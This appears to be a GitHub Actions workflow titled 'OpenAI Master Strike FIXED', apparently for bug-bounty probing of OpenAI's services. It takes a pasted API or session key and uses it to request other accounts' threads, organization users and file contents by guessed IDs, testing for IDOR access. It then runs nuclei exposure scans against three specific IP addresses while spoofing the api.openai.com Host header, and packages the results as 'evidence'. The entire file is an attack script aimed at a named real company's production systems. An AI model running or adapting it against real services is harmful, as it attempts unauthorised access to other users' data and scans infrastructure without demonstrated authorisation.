name: OpenAI Master Strike FIXED
on:
  workflow_dispatch:
    inputs:
      auth_token:
        description: 'Paste sk- or sess- key (DO NOT include "Bearer")'
        required: true

jobs:
  strike:
    runs-on: ubuntu-latest
    steps:
      - name: Setup
        run: |
          mkdir -p poc/idor poc/infra
          go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
          echo "$HOME/go/bin" >> $GITHUB_PATH

      - name: IDOR & Infra Strike
        run: |
          CLEAN_TOKEN=$(echo "${{ github.event.inputs.auth_token }}" | sed 's/Bearer //g' | xargs)
          
          # 1. IDOR Tests (Direct API calls)
          # Replace 'thread_target_abc' with any ID found in your recon
          urls=(
            "https://api.openai.com/v1/threads/thread_target_abc"
            "https://api.openai.com/v1/organizations/org-default/users"
            "https://api.openai.com/v1/files/file-test-999/content"
          )
          
          for url in "${urls[@]}"; do
            echo "Testing IDOR: $url"
            curl -s -v -H "Authorization: Bearer $CLEAN_TOKEN" -H "OpenAI-Beta: assistants=v2" "$url" > "poc/idor/$(date +%s).txt" 2>&1
          done

          # 2. Infra Strike (The Korea Cluster)
          echo "13.125.127.14" >> ips.txt
          echo "43.202.58.124" >> ips.txt
          echo "43.202.58.199" >> ips.txt
          
          nuclei -l ips.txt -H "Host: api.openai.com" -t http/exposures/ -o poc/infra/vulns.txt

      - name: Pack Evidence
        if: always()
        run: |
          zip -r openai_proof.zip poc/

      - name: Upload
        uses: actions/upload-artifact@v4
        with:
          name: OpenAI-Bounty-Evidence
          path: openai_proof.zip
          
